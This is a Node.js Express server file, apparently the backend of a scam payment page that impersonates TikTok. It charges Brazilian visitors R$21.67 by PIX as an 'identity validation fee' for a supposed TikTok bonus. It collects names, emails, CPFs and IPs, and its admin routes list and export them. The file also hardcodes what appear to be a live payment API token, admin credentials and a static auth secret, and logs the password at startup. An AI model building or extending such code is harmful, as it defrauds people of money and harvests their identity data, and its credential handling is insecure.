// ==================== IMPORTAÇÕES ====================
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const moment = require('moment');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ==================== CONFIGURAÇÕES ====================
const PLUMIFY_CONFIG = {
    token: process.env.PLUMIFY_TOKEN || '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa',
    accountId: process.env.PLUMIFY_ACCOUNT_ID || '9kajnnbn2c',
    baseURL: 'https://api.plumify.com.br/api/public/v1',
    productHash: process.env.PLUMIFY_PRODUCT_HASH || 'flnqw8vjsf'
};

// Configurações do Admin (ALTERE AQUI SUAS CREDENCIAIS!)
const ADMIN_CONFIG = {
    username: process.env.ADMIN_USER || 'tiktok_admin',
    password: process.env.ADMIN_PASS || 'Admin@TikTok2024!',
    jwtSecret: process.env.JWT_SECRET || 'tiktok-pix-secret-key-2024'
};

// Banco de dados em memória (persistente em arquivo JSON)
let database = {
    payments: [],
    users: [],
    logs: [],
    settings: {
        siteName: 'TikTok PIX',
        taxAmount: 21.67,
        mainBalance: 4596.72,
        currency: 'BRL'
    }
};

// Caminhos dos arquivos
const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'database.json');
const LOG_FILE = path.join(DATA_DIR, 'logs.json');

// ==================== INICIALIZAÇÃO ====================
function initializeDatabase() {
    // Criar diretório data se não existir
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    
    // Carregar dados salvos
    if (fs.existsSync(DB_FILE)) {
        try {
            const savedData = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
            database = { ...database, ...savedData };
            console.log('✅ Banco de dados carregado');
        } catch (err) {
            console.error('❌ Erro ao carregar banco de dados:', err.message);
        }
    }
    
    // Carregar logs
    if (fs.existsSync(LOG_FILE)) {
        try {
            database.logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
        } catch (err) {
            console.error('❌ Erro ao carregar logs:', err.message);
        }
    }
}

// Salvar banco de dados
function saveDatabase() {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify({
            payments: database.payments,
            users: database.users,
            settings: database.settings
        }, null, 2));
        
        // Salvar logs separadamente
        fs.writeFileSync(LOG_FILE, JSON.stringify(database.logs, null, 2));
    } catch (err) {
        console.error('❌ Erro ao salvar banco de dados:', err.message);
    }
}

// Registrar log
function logAction(action, details = '', req = null) {
    const logEntry = {
        id: uuidv4(),
        action,
        details,
        timestamp: new Date().toISOString(),
        ip: req ? req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress : 'system',
        userAgent: req ? req.headers['user-agent'] : 'system',
        method: req ? req.method : 'system',
        url: req ? req.originalUrl : 'system'
    };
    
    database.logs.unshift(logEntry); // Adiciona no início
    
    // Manter apenas últimos 1000 logs
    if (database.logs.length > 1000) {
        database.logs = database.logs.slice(0, 1000);
    }
    
    saveDatabase();
    console.log(`📝 LOG: ${action} - ${details}`);
}

// ==================== MIDDLEWARES ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// Log de todas as requisições
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url} - ${req.ip}`);
    next();
});

// Forçar HTTPS em produção
app.use((req, res, next) => {
    if (process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] !== 'https') {
        return res.redirect(301, `https://${req.headers.host}${req.url}`);
    }
    next();
});

// ==================== FUNÇÕES AUXILIARES ====================
function generateOrderId() {
    const timestamp = Date.now().toString().slice(-8);
    const random = Math.random().toString(36).substr(2, 6).toUpperCase();
    return `TKPIX${timestamp}${random}`;
}

function formatCPF(cpf) {
    cpf = cpf.replace(/\D/g, '');
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
}

function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

function authenticateAdmin(req, res, next) {
    const authHeader = req.headers.authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ success: false, error: 'Token não fornecido' });
    }
    
    const token = authHeader.split(' ')[1];
    
    // Verificação simples do token (em produção use JWT)
    if (token !== ADMIN_CONFIG.jwtSecret) {
        return res.status(401).json({ success: false, error: 'Token inválido' });
    }
    
    next();
}

// ==================== ROTAS PÚBLICAS ====================
app.get('/', (req, res) => {
    res.redirect('/pagamento');
});

app.get('/pagamento', (req, res) => {
    res.sendFile(__dirname + '/pagamento.html');
});

app.get('/login.html', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

app.get('/admin.html', (req, res) => {
    // Verificar token via cookie/localStorage no frontend
    res.sendFile(__dirname + '/admin.html');
});

// Health Check
app.get('/health', (req, res) => {
    const health = {
        status: 'online',
        service: 'TikTok PIX API',
        version: '2.0.0',
        timestamp: new Date().toISOString(),
        environment: process.env.NODE_ENV || 'development',
        stats: {
            totalPayments: database.payments.length,
            totalUsers: database.users.length,
            totalRevenue: database.payments
                .filter(p => p.status === 'paid')
                .reduce((sum, p) => sum + p.amount, 0)
        }
    };
    
    res.json(health);
    logAction('HEALTH_CHECK', 'Health check realizado', req);
});

// API Test
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API TikTok PIX funcionando!',
        server: 'Render',
        url: 'https://pagamento-cgzk.onrender.com',
        database: 'Ativo',
        timestamp: new Date().toISOString()
    });
    
    logAction('API_TEST', 'Teste de API realizado', req);
});

// ==================== API PIX ====================
app.post('/api/pix/create', async (req, res) => {
    console.log('=== CRIANDO PIX ===');
    logAction('PIX_CREATE_START', 'Iniciando criação de PIX', req);
    
    try {
        const { customerName, customerEmail, customerCpf } = req.body;
        
        // Validação
        if (!customerName || !customerEmail || !customerCpf) {
            const error = 'Dados incompletos';
            logAction('PIX_CREATE_ERROR', error, req);
            return res.status(400).json({
                success: false,
                error: 'Preencha todos os campos: nome, email e CPF.'
            });
        }
        
        // Limpar e validar CPF
        const cpfClean = customerCpf.replace(/\D/g, '');
        if (cpfClean.length !== 11) {
            const error = 'CPF inválido';
            logAction('PIX_CREATE_ERROR', error, req);
            return res.status(400).json({
                success: false,
                error: 'CPF inválido. Digite 11 números.'
            });
        }
        
        console.log('✅ Dados recebidos:', { customerName, customerEmail, cpfClean });
        
        // Criar ID único
        const orderId = generateOrderId();
        const paymentId = `PIX_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Registrar usuário
        let user = database.users.find(u => u.cpf === cpfClean);
        if (!user) {
            user = {
                id: uuidv4(),
                name: customerName.trim(),
                email: customerEmail.trim(),
                cpf: cpfClean,
                createdAt: new Date().toISOString(),
                totalPayments: 0,
                totalSpent: 0,
                lastPayment: null
            };
            database.users.push(user);
        }
        
        // Criar registro de pagamento
        const payment = {
            id: paymentId,
            orderId: orderId,
            customerId: user.id,
            customerName: customerName.trim(),
            customerEmail: customerEmail.trim(),
            customerCpf: cpfClean,
            amount: 21.67,
            amountCents: 2167,
            status: 'pending',
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutos
            ip: req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress,
            userAgent: req.headers['user-agent'],
            metadata: {
                source: 'web',
                device: req.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop'
            }
        };
        
        database.payments.push(payment);
        logAction('PIX_CREATED', `Pagamento ${paymentId} criado para ${customerEmail}`, req);
        
        // Chamar API Plumify
        const payload = {
            api_token: PLUMIFY_CONFIG.token,
            amount: 2167,
            payment_method: "pix",
            customer: {
                name: customerName.trim(),
                email: customerEmail.trim(),
                phone_number: "61995512071",
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [
                {
                    product_hash: PLUMIFY_CONFIG.productHash,
                    title: "Taxa de Validação de Identidade - TikTok Bônus",
                    price: 2167,
                    quantity: 1,
                    tangible: false,
                    requires_shipping: false,
                    operation_type: 1
                }
            ],
            offer_hash: `tiktok_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        console.log('📤 Enviando para Plumify...');
        
        const response = await axios.post(
            `${PLUMIFY_CONFIG.baseURL}/transactions`,
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout: 30000
            }
        );
        
        console.log('✅ Resposta Plumify - Status:', response.status);
        
        const data = response.data;
        
        if (data.error) {
            console.error('❌ Erro Plumify:', data.error);
            logAction('PLUMIFY_ERROR', data.error.message || 'Erro na Plumify', req);
            
            // Atualizar status do pagamento para failed
            payment.status = 'failed';
            payment.error = data.error;
            saveDatabase();
            
            return res.status(400).json({
                success: false,
                error: data.error.message || 'Erro na geração do PIX'
            });
        }
        
        // Atualizar pagamento com dados da Plumify
        payment.transactionId = data.id || data.hash;
        payment.pixCode = data.pix?.pix_qr_code || data.qr_code || data.pix_qr_code || '';
        payment.pixUrl = data.pix?.pix_url || data.qr_code_image || data.pix_url || 
                        `https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=${encodeURIComponent(payment.pixCode)}`;
        payment.plumifyData = data;
        
        saveDatabase();
        logAction('PIX_GENERATED', `PIX ${paymentId} gerado com sucesso`, req);
        
        // Resposta para frontend
        const result = {
            success: true,
            message: 'PIX gerado com sucesso!',
            payment: {
                id: payment.id,
                orderId: payment.orderId,
                amount: payment.amount,
                pixCode: payment.pixCode,
                pixUrl: payment.pixUrl,
                status: payment.status,
                expiresAt: payment.expiresAt,
                createdAt: payment.createdAt
            }
        };
        
        console.log('🎯 PIX gerado com sucesso!');
        res.json(result);
        
    } catch (error) {
        console.error('❌ ERRO CRÍTICO NO PIX:', error.message);
        logAction('PIX_CREATE_CRITICAL_ERROR', error.message, req);
        
        let errorMessage = 'Erro ao gerar PIX';
        if (error.response) {
            errorMessage = error.response.data?.message || `Erro ${error.response.status}`;
        } else if (error.request) {
            errorMessage = 'Sem resposta do servidor de pagamento';
        }
        
        res.status(error.response?.status || 500).json({
            success: false,
            error: errorMessage
        });
    }
});

// Verificar status do PIX
app.get('/api/pix/status/:id', (req, res) => {
    const { id } = req.params;
    
    const payment = database.payments.find(p => p.id === id || p.orderId === id);
    
    if (!payment) {
        return res.status(404).json({
            success: false,
            error: 'Pagamento não encontrado'
        });
    }
    
    res.json({
        success: true,
        payment: {
            id: payment.id,
            orderId: payment.orderId,
            status: payment.status,
            amount: payment.amount,
            createdAt: payment.createdAt,
            expiresAt: payment.expiresAt,
            customerName: payment.customerName
        }
    });
    
    logAction('PIX_STATUS_CHECK', `Status verificado para pagamento ${id}`, req);
});

// ==================== API ADMIN ====================
// Login do admin
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    console.log('🔐 Tentativa de login:', { username });
    
    if (!username || !password) {
        logAction('ADMIN_LOGIN_FAILED', 'Campos vazios', req);
        return res.status(400).json({
            success: false,
            error: 'Usuário e senha são obrigatórios'
        });
    }
    
    // Verificar credenciais
    const isValid = username === ADMIN_CONFIG.username && password === ADMIN_CONFIG.password;
    
    if (!isValid) {
        logAction('ADMIN_LOGIN_FAILED', `Tentativa falha para ${username}`, req);
        return res.status(401).json({
            success: false,
            error: 'Credenciais inválidas'
        });
    }
    
    // Login bem-sucedido
    const token = ADMIN_CONFIG.jwtSecret;
    
    logAction('ADMIN_LOGIN_SUCCESS', `Usuário ${username} logou`, req);
    
    res.json({
        success: true,
        message: 'Login realizado com sucesso!',
        token: token,
        user: {
            username: username,
            role: 'admin',
            permissions: ['view', 'edit', 'delete', 'export']
        }
    });
});

// Dashboard do admin (requer autenticação)
app.get('/api/admin/dashboard', authenticateAdmin, (req, res) => {
    // Calcular estatísticas
    const totalPayments = database.payments.length;
    const paidPayments = database.payments.filter(p => p.status === 'paid').length;
    const pendingPayments = database.payments.filter(p => p.status === 'pending').length;
    const failedPayments = database.payments.filter(p => p.status === 'failed').length;
    
    const totalRevenue = database.payments
        .filter(p => p.status === 'paid')
        .reduce((sum, p) => sum + p.amount, 0);
    
    const today = new Date().toISOString().split('T')[0];
    const todayPayments = database.payments.filter(p => 
        p.createdAt.split('T')[0] === today
    );
    const todayRevenue = todayPayments
        .filter(p => p.status === 'paid')
        .reduce((sum, p) => sum + p.amount, 0);
    
    // Dados para gráfico (últimos 7 dias)
    const chartData = {
        labels: [],
        revenues: [],
        payments: []
    };
    
    for (let i = 6; i >= 0; i--) {
        const date = new Date();
        date.setDate(date.getDate() - i);
        const dateStr = date.toISOString().split('T')[0];
        const label = date.toLocaleDateString('pt-BR', { weekday: 'short' });
        
        const dayPayments = database.payments.filter(p => 
            p.createdAt.split('T')[0] === dateStr
        );
        
        const dayRevenue = dayPayments
            .filter(p => p.status === 'paid')
            .reduce((sum, p) => sum + p.amount, 0);
        
        chartData.labels.push(label);
        chartData.revenues.push(dayRevenue);
        chartData.payments.push(dayPayments.length);
    }
    
    // Últimos 10 pagamentos
    const recentPayments = [...database.payments]
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
        .slice(0, 10)
        .map(p => ({
            id: p.id,
            orderId: p.orderId,
            customerName: p.customerName,
            amount: p.amount,
            status: p.status,
            createdAt: p.createdAt,
            customerEmail: p.customerEmail
        }));
    
    // Últimos 5 logs
    const recentLogs = database.logs.slice(0, 5);
    
    res.json({
        success: true,
        data: {
            stats: {
                totalPayments,
                paidPayments,
                pendingPayments,
                failedPayments,
                totalRevenue: formatCurrency(totalRevenue),
                todayPayments: todayPayments.length,
                todayRevenue: formatCurrency(todayRevenue),
                totalUsers: database.users.length
            },
            chartData,
            recentPayments,
            recentLogs,
            settings: database.settings
        }
    });
    
    logAction('ADMIN_DASHBOARD_ACCESS', 'Dashboard acessado', req);
});

// Listar todos os pagamentos
app.get('/api/admin/payments', authenticateAdmin, (req, res) => {
    const { status, page = 1, limit = 50, search = '' } = req.query;
    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);
    
    let filteredPayments = [...database.payments];
    
    // Filtrar por status
    if (status && status !== 'all') {
        filteredPayments = filteredPayments.filter(p => p.status === status);
    }
    
    // Buscar por nome, email, CPF ou ID
    if (search) {
        const searchLower = search.toLowerCase();
        filteredPayments = filteredPayments.filter(p =>
            p.customerName.toLowerCase().includes(searchLower) ||
            p.customerEmail.toLowerCase().includes(searchLower) ||
            p.customerCpf.includes(search) ||
            p.id.toLowerCase().includes(searchLower) ||
            p.orderId.toLowerCase().includes(searchLower)
        );
    }
    
    // Ordenar por data (mais recente primeiro)
    filteredPayments.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    
    // Paginação
    const startIndex = (pageNum - 1) * limitNum;
    const endIndex = startIndex + limitNum;
    const paginatedPayments = filteredPayments.slice(startIndex, endIndex);
    
    // Formatar dados para exibição
    const formattedPayments = paginatedPayments.map(p => ({
        id: p.id,
        orderId: p.orderId,
        customerName: p.customerName,
        customerEmail: p.customerEmail,
        customerCpf: formatCPF(p.customerCpf),
        amount: formatCurrency(p.amount),
        amountRaw: p.amount,
        status: p.status,
        createdAt: moment(p.createdAt).format('DD/MM/YYYY HH:mm:ss'),
        expiresAt: p.expiresAt ? moment(p.expiresAt).format('DD/MM/YYYY HH:mm') : null,
        paidAt: p.paidAt ? moment(p.paidAt).format('DD/MM/YYYY HH:mm:ss') : null,
        ip: p.ip,
        pixCode: p.pixCode ? '••••••••••' : null
    }));
    
    res.json({
        success: true,
        payments: formattedPayments,
        pagination: {
            page: pageNum,
            limit: limitNum,
            total: filteredPayments.length,
            pages: Math.ceil(filteredPayments.length / limitNum)
        },
        filters: {
            status: status || 'all',
            search: search || ''
        }
    });
    
    logAction('ADMIN_PAYMENTS_LIST', `Listou pagamentos (página ${page})`, req);
});

// Detalhes do pagamento
app.get('/api/admin/payments/:id', authenticateAdmin, (req, res) => {
    const { id } = req.params;
    
    const payment = database.payments.find(p => p.id === id);
    
    if (!payment) {
        return res.status(404).json({
            success: false,
            error: 'Pagamento não encontrado'
        });
    }
    
    // Encontrar usuário
    const user = database.users.find(u => u.id === payment.customerId);
    
    res.json({
        success: true,
        payment: {
            ...payment,
            customerCpf: formatCPF(payment.customerCpf),
            amountFormatted: formatCurrency(payment.amount),
            createdAtFormatted: moment(payment.createdAt).format('DD/MM/YYYY HH:mm:ss'),
            expiresAtFormatted: moment(payment.expiresAt).format('DD/MM/YYYY HH:mm:ss'),
            user: user ? {
                name: user.name,
                email: user.email,
                totalPayments: user.totalPayments,
                totalSpent: formatCurrency(user.totalSpent)
            } : null
        }
    });
    
    logAction('ADMIN_PAYMENT_DETAILS', `Visualizou pagamento ${id}`, req);
});

// Marcar como pago
app.post('/api/admin/payments/:id/paid', authenticateAdmin, (req, res) => {
    const { id } = req.params;
    
    const payment = database.payments.find(p => p.id === id);
    
    if (!payment) {
        return res.status(404).json({
            success: false,
            error: 'Pagamento não encontrado'
        });
    }
    
    // Atualizar status
    payment.status = 'paid';
    payment.paidAt = new Date().toISOString();
    
    // Atualizar estatísticas do usuário
    const user = database.users.find(u => u.id === payment.customerId);
    if (user) {
        user.totalPayments = (user.totalPayments || 0) + 1;
        user.totalSpent = (user.totalSpent || 0) + payment.amount;
        user.lastPayment = payment.paidAt;
    }
    
    saveDatabase();
    
    logAction('PAYMENT_MARKED_PAID', `Pagamento ${id} marcado como pago`, req);
    
    res.json({
        success: true,
        message: 'Pagamento marcado como pago com sucesso!'
    });
});

// Excluir pagamento
app.delete('/api/admin/payments/:id', authenticateAdmin, (req, res) => {
    const { id } = req.params;
    
    const index = database.payments.findIndex(p => p.id === id);
    
    if (index === -1) {
        return res.status(404).json({
            success: false,
            error: 'Pagamento não encontrado'
        });
    }
    
    const payment = database.payments[index];
    
    // Remover pagamento
    database.payments.splice(index, 1);
    saveDatabase();
    
    logAction('PAYMENT_DELETED', `Pagamento ${id} excluído`, req);
    
    res.json({
        success: true,
        message: 'Pagamento excluído com sucesso!',
        deletedPayment: {
            id: payment.id,
            customerName: payment.customerName,
            amount: payment.amount
        }
    });
});

// Listar usuários
app.get('/api/admin/users', authenticateAdmin, (req, res) => {
    const { page = 1, limit = 50 } = req.query;
    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);
    
    // Ordenar por última atividade
    const sortedUsers = [...database.users].sort((a, b) => {
        const dateA = a.lastPayment || a.createdAt;
        const dateB = b.lastPayment || b.createdAt;
        return new Date(dateB) - new Date(dateA);
    });
    
    // Paginação
    const startIndex = (pageNum - 1) * limitNum;
    const endIndex = startIndex + limitNum;
    const paginatedUsers = sortedUsers.slice(startIndex, endIndex);
    
    // Formatar dados
    const formattedUsers = paginatedUsers.map(user => ({
        id: user.id,
        name: user.name,
        email: user.email,
        cpf: formatCPF(user.cpf),
        createdAt: moment(user.createdAt).format('DD/MM/YYYY'),
        lastPayment: user.lastPayment ? moment(user.lastPayment).format('DD/MM/YYYY HH:mm') : 'Nunca',
        totalPayments: user.totalPayments || 0,
        totalSpent: formatCurrency(user.totalSpent || 0),
        status: user.totalPayments > 0 ? 'active' : 'inactive'
    }));
    
    res.json({
        success: true,
        users: formattedUsers,
        pagination: {
            page: pageNum,
            limit: limitNum,
            total: sortedUsers.length,
            pages: Math.ceil(sortedUsers.length / limitNum)
        }
    });
    
    logAction('ADMIN_USERS_LIST', 'Listou usuários', req);
});

// Exportar dados
app.get('/api/admin/export/:format', authenticateAdmin, (req, res) => {
    const { format } = req.params;
    
    if (format === 'csv') {
        // Converter pagamentos para CSV
        const headers = ['ID', 'Cliente', 'Email', 'CPF', 'Valor', 'Status', 'Criado em', 'Pago em'];
        const rows = database.payments.map(p => [
            p.id,
            p.customerName,
            p.customerEmail,
            formatCPF(p.customerCpf),
            p.amount,
            p.status,
            moment(p.createdAt).format('DD/MM/YYYY HH:mm:ss'),
            p.paidAt ? moment(p.paidAt).format('DD/MM/YYYY HH:mm:ss') : ''
        ]);
        
        const csv = [headers, ...rows].map(row => 
            row.map(cell => `"${cell}"`).join(',')
        ).join('\n');
        
        res.header('Content-Type', 'text/csv');
        res.attachment(`tiktok-pix-pagamentos-${new Date().toISOString().split('T')[0]}.csv`);
        res.send(csv);
        
    } else if (format === 'json') {
        res.json({
            success: true,
            exportedAt: new Date().toISOString(),
            stats: {
                totalPayments: database.payments.length,
                totalUsers: database.users.length,
                totalRevenue: database.payments
                    .filter(p => p.status === 'paid')
                    .reduce((sum, p) => sum + p.amount, 0)
            },
            payments: database.payments,
            users: database.users,
            logs: database.logs.slice(0, 100) // Últimos 100 logs
        });
    } else {
        res.status(400).json({
            success: false,
            error: 'Formato não suportado'
        });
    }
    
    logAction('DATA_EXPORTED', `Exportou dados em formato ${format}`, req);
});

// Limpar dados antigos
app.post('/api/admin/cleanup', authenticateAdmin, (req, res) => {
    const { days = 30 } = req.body;
    
    const cutoffDate = new Date();
    cutoffDate.setDate(cutoffDate.getDate() - days);
    
    const oldPayments = database.payments.filter(p => 
        new Date(p.createdAt) < cutoffDate && p.status !== 'pending'
    );
    
    // Manter apenas pagamentos recentes ou pendentes
    database.payments = database.payments.filter(p => 
        new Date(p.createdAt) >= cutoffDate || p.status === 'pending'
    );
    
    // Limpar logs antigos (manter últimos 1000)
    if (database.logs.length > 1000) {
        database.logs = database.logs.slice(0, 1000);
    }
    
    saveDatabase();
    
    logAction('DATA_CLEANUP', `Limpeza realizada: ${oldPayments.length} pagamentos removidos`, req);
    
    res.json({
        success: true,
        message: `Limpeza realizada com sucesso!`,
        removed: {
            payments: oldPayments.length,
            logs: database.logs.length > 1000 ? database.logs.length - 1000 : 0
        }
    });
});

// Atualizar configurações
app.post('/api/admin/settings', authenticateAdmin, (req, res) => {
    const { settings } = req.body;
    
    if (!settings) {
        return res.status(400).json({
            success: false,
            error: 'Configurações não fornecidas'
        });
    }
    
    // Atualizar configurações
    database.settings = { ...database.settings, ...settings };
    saveDatabase();
    
    logAction('SETTINGS_UPDATED', 'Configurações atualizadas', req);
    
    res.json({
        success: true,
        message: 'Configurações atualizadas com sucesso!',
        settings: database.settings
    });
});

// Obter logs
app.get('/api/admin/logs', authenticateAdmin, (req, res) => {
    const { limit = 100, action } = req.query;
    const limitNum = parseInt(limit);
    
    let filteredLogs = [...database.logs];
    
    // Filtrar por ação se especificado
    if (action) {
        filteredLogs = filteredLogs.filter(log => 
            log.action.toLowerCase().includes(action.toLowerCase())
        );
    }
    
    // Limitar quantidade
    filteredLogs = filteredLogs.slice(0, limitNum);
    
    // Formatar datas
    const formattedLogs = filteredLogs.map(log => ({
        ...log,
        timestampFormatted: moment(log.timestamp).format('DD/MM/YYYY HH:mm:ss'),
        timeAgo: moment(log.timestamp).fromNow()
    }));
    
    res.json({
        success: true,
        logs: formattedLogs,
        total: database.logs.length,
        filtered: filteredLogs.length
    });
    
    logAction('LOGS_ACCESSED', 'Acessou logs do sistema', req);
});

// ==================== WEBHOOK PLUMIFY ====================
app.post('/webhook/plumify', (req, res) => {
    const webhookData = req.body;
    
    console.log('📩 Webhook recebido da Plumify:', webhookData);
    logAction('WEBHOOK_RECEIVED', 'Webhook da Plumify', req);
    
    // Processar webhook baseado no status
    if (webhookData.status === 'paid') {
        // Encontrar pagamento pelo transaction_id
        const payment = database.payments.find(p => 
            p.transactionId === webhookData.id || 
            p.plumifyData?.id === webhookData.id
        );
        
        if (payment) {
            payment.status = 'paid';
            payment.paidAt = new Date().toISOString();
            payment.webhookData = webhookData;
            
            // Atualizar usuário
            const user = database.users.find(u => u.id === payment.customerId);
            if (user) {
                user.totalPayments = (user.totalPayments || 0) + 1;
                user.totalSpent = (user.totalSpent || 0) + payment.amount;
                user.lastPayment = payment.paidAt;
            }
            
            saveDatabase();
            
            logAction('PAYMENT_CONFIRMED', `Pagamento ${payment.id} confirmado via webhook`, req);
            console.log(`✅ Pagamento ${payment.id} confirmado via webhook`);
        }
    }
    
    res.json({ received: true });
});

// ==================== ROTAS DE FALLBACK ====================
app.get('*', (req, res) => {
    // Tentar servir arquivo estático
    const filePath = __dirname + req.path;
    
    if (fs.existsSync(filePath) && !filePath.includes('..')) {
        res.sendFile(filePath, (err) => {
            if (err) {
                res.redirect('/pagamento');
            }
        });
    } else {
        res.redirect('/pagamento');
    }
});

// ==================== INICIAR SERVIDOR ====================
initializeDatabase();

app.listen(PORT, () => {
    console.log(`
    🚀 TIKTOK PIX API - SISTEMA COMPLETO
    ============================================
    ✅ Servidor iniciado na porta: ${PORT}
    🌐 URL Principal: https://pagamento-cgzk.onrender.com
    🔐 Login Admin: /login.html
    📊 Painel Admin: /admin.html
    💰 Pagamento: /pagamento
    📈 API Health: /health
    📁 Banco de dados: ${DATA_DIR}/
    👤 Credenciais Admin: ${ADMIN_CONFIG.username} / ${ADMIN_CONFIG.password}
    🗄️  Pagamentos: ${database.payments.length}
    👥 Usuários: ${database.users.length}
    🕐 ${new Date().toISOString()}
    ============================================
    `);
    
    logAction('SERVER_STARTED', `Servidor iniciado na porta ${PORT}`);
});

// Salvar banco de dados periodicamente
setInterval(() => {
    saveDatabase();
    console.log('💾 Banco de dados salvo automaticamente');
}, 300000); // A cada 5 minutos